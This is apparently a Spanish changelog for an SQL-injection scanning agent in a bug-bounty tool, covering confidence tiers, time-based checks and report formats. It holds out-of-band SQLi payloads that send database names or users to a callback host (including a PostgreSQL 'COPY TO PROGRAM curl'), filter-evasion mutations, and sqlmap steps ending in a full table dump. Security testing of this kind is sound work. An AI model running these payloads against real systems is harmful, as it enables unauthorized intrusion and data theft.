# SQLi Agent v3 - Mejoras Implementadas

**Fecha:** 2026-01-23
**Archivos modificados:**
- `bugtrace/agents/sqli_agent.py` (reescrito completo, ~1500 líneas)
- `bugtrace/agents/sqlmap_agent.py` (técnica por defecto cambiada)
- `bugtrace/tools/exploitation/sqli.py` (mejorado, ~470 líneas)

---

## Resumen Ejecutivo

Se ha transformado el SQLi Agent de un detector básico a un especialista inteligente con 13 mejoras principales enfocadas en:

1. **Reducir falsos positivos** (especialmente time-based)
2. **Mejorar la precisión** (jerarquía de confianza)
3. **Aumentar la cobertura** (OOB, JSON, second-order)
4. **Mejorar los reportes** (comandos SQLMap progresivos, explicación LLM)

---

## Mejoras Implementadas

### 1. Jerarquía de Confianza SQLi

```
TIER 3 (MÁXIMA) → VALIDATED_CONFIRMED:
- Union-Based + datos extraídos
- Error-Based + tablas/columnas visibles
- OOB callback recibido (Interactsh)
- SQLMap --dbs funcionó

TIER 2 (ALTA) → VALIDATED_CONFIRMED:
- Error-Based con mensaje SQL visible
- Boolean-Based con diferencia >50%

TIER 1 (MEDIA) → PENDING_VALIDATION:
- Boolean-Based con diferencia pequeña (10-50%)
- Time-Based con verificación triple

TIER 0 (BAJA) → NO REPORTAR:
- Time-Based sin verificación
- Anomalías sin confirmación
```

### 2. Sin Time-Based por Defecto

**Problema:** Time-based con 5 segundos causa muchos FPs por latencia de red.

**Solución:**
```python
# SQLMapAgent - técnica por defecto cambiada
technique: str = "BEUS"  # B=Boolean, E=Error, U=Union, S=Stacked
# NO incluye T=Time
```

### 3. Verificación Time-Based Triple

Si se usa time-based, requiere 3 pruebas:

```python
# 1. Baseline (sin sleep) - debe ser rápido (<2s)
# 2. Sleep corto (3s) - debe tomar ~3-6s
# 3. Sleep largo (10s) - debe tomar ~8-15s

# Solo confirma si hay correlación clara:
if (baseline < 2 and 2 < short < 6 and 8 < long < 15):
    return True  # Vulnerable
```

### 4. Priorización de Parámetros

```python
HIGH_PRIORITY_SQLI_PARAMS = [
    # IDs numéricos (máxima prioridad)
    "id", "user_id", "product_id", "order_id", ...
    # Ordenamiento/Paginación
    "sort", "order", "orderby", "limit", "offset", ...
    # Búsqueda
    "search", "q", "query", "filter", "keyword", ...
    # Auth
    "username", "user", "email", "login", ...
]
```

### 5. OOB SQLi con Interactsh

Payloads específicos por base de datos:

```python
OOB_PAYLOADS = {
    "MySQL": [
        "' AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT database()), '.{oob_host}\\\\a'))-- ",
    ],
    "MSSQL": [
        "'; EXEC master..xp_dirtree '//{oob_host}/sqli'-- ",
    ],
    "Oracle": [
        "' AND UTL_HTTP.REQUEST('http://{oob_host}/'||(SELECT user FROM dual))='x'-- ",
    ],
    "PostgreSQL": [
        "'; COPY (SELECT '') TO PROGRAM 'curl http://{oob_host}/sqli'-- ",
    ],
}
```

### 6. Detección de Filtros + Mutación Adaptativa

```python
# Detecta qué caracteres están filtrados
filtered = await self._detect_filtered_chars(session, param)
# Ejemplo: {"'", " ", "OR"}

# Genera variantes que evitan los filtros
FILTER_MUTATIONS = {
    "'": ["''", "\\'", "%27", "char(39)"],
    " ": ["/**/", "%20", "+", "%09"],
    "OR": ["||", "oR", "OR/**/"],
    ...
}
```

### 7. Extracción de Info de Errores

```python
def _extract_info_from_error(self, error_response: str) -> Dict:
    return {
        "tables_leaked": ["users", "orders"],
        "columns_leaked": ["password", "email"],
        "server_paths": ["/var/www/html/app.php"],
        "db_version": "MySQL 5.7.32",
        "db_type": "MySQL"
    }
```

### 8. JSON/API Body Injection

```python
# Prueba SQLi en cada campo del JSON
async def _test_json_body_injection(self, session, url, json_body):
    # Soporta estructuras anidadas
    # {"user": {"profile": {"name": "test"}}}
    # → Prueba: JSON:user.profile.name
```

### 9. Second-Order SQLi

```python
# Inyecta en un lugar, observa en otro
observation_points = [
    "https://target.com/profile",
    "https://target.com/admin/users"
]

# Inyecta en registro → observa en perfil
```

### 10. Detección de Prepared Statements (Early Exit)

```python
# Si todas las respuestas son idénticas (sin errores SQL)
# probablemente usa prepared statements → no perder tiempo
if len(set(responses)) == 1 and not has_sql_error:
    logger.info("Likely uses prepared statements, skipping")
    return  # Early exit
```

### 11. Comandos SQLMap Completos

```python
def _build_full_sqlmap_command(self, param, technique, db_type, tamper):
    """Genera comando completo con todo lo necesario."""
    return """
    sqlmap -u 'https://target.com/page?id=1' \\
      --batch \\
      -p id \\
      --technique=E \\
      --dbms=mysql \\
      --tamper=space2comment,randomcase \\
      --cookie='session=abc123'
    """
```

### 12. Comandos SQLMap Progresivos

```python
[
    {"step": "1. Confirmar vulnerabilidad", "command": "sqlmap -u '...' --batch"},
    {"step": "2. Listar bases de datos", "command": "sqlmap -u '...' --dbs"},
    {"step": "3. Listar tablas", "command": "sqlmap -u '...' -D db --tables"},
    {"step": "4. Listar columnas", "command": "sqlmap -u '...' -D db -T users --columns"},
    {"step": "5. Extraer datos", "command": "sqlmap -u '...' -D db -T users --dump"},
]
```

### 13. Explicación LLM para Triager

```python
async def _generate_llm_exploitation_explanation(self, finding):
    """
    Genera explicación profesional:
    - Tipo de vulnerabilidad
    - Impacto potencial
    - Datos afectados
    - Recomendación de remediación
    """
```

---

## Flujo de Detección (run_loop)

```
1. Initialize & Baseline
   └─ Obtener tiempo de respuesta base
   └─ Inicializar Interactsh para OOB

2. Extraer y Priorizar Parámetros
   └─ URL params + POST params
   └─ Ordenar: high → medium → low priority

3. Per-Parameter Testing
   ├─ 3.1 Detect Prepared Statements (early exit)
   ├─ 3.2 Detect Filtered Characters
   ├─ 3.3 OOB SQLi (Interactsh)
   ├─ 3.4 Error-Based Testing
   ├─ 3.5 Boolean-Based Testing
   └─ 3.6 Time-Based (solo con triple verification)

4. JSON Body Injection (si POST data es JSON)

5. Second-Order SQLi (si observation_points)

6. SQLMap Fallback (si nada encontrado)
```

---

## Estadísticas Disponibles

```python
self._stats = {
    "params_tested": 0,
    "vulns_found": 0,
    "oob_callbacks": 0,
    "filters_detected": 0,
    "prepared_statement_exits": 0,
}
```

---

## Estructura del Finding

```python
{
    "type": "SQLI",
    "url": "https://target.com/page?id=1",
    "parameter": "id",
    "payload": "' OR '1'='1",
    "technique": "error_based",  # o boolean_based, oob, time_based, second_order
    "evidence": {
        "sql_error_visible": True,
        "db_type": "MySQL",
        "tables_leaked": ["users"],
        "columns_leaked": ["password"],
    },
    "severity": "CRITICAL",
    "validated": True,
    "status": "VALIDATED_CONFIRMED",  # o PENDING_VALIDATION
    "exploitation_explanation": "...",  # Generado por LLM
    "reproduction_commands": [...]  # Comandos SQLMap progresivos
}
```

---

## Testing

```bash
# Test básico
python -m bugtrace scan https://testphp.vulnweb.com/listproducts.php?cat=1

# Con JSON body
python -m bugtrace scan https://api.target.com/users \
  --post-data '{"user_id": 1, "action": "view"}'

# Con observation points (second-order)
python -m bugtrace scan https://target.com/register \
  --observation-points "https://target.com/profile,https://target.com/admin"
```

---

## Notas Importantes

1. **Time-Based es SIEMPRE PENDING_VALIDATION** incluso con triple verification
2. **OOB es la técnica más confiable** para blind SQLi
3. **Los comandos SQLMap en el reporte** incluyen cookies/headers si fueron necesarios
4. **La explicación LLM** es para triagers, no incluye código de exploit

---

## Archivos Relacionados

- `bugtrace/agents/sqli_agent.py` - Agente principal v3
- `bugtrace/agents/sqlmap_agent.py` - Wrapper de SQLMap
- `bugtrace/tools/exploitation/sqli.py` - Detector con browser
- `bugtrace/tools/external/__init__.py` - Interfaz con SQLMap Docker
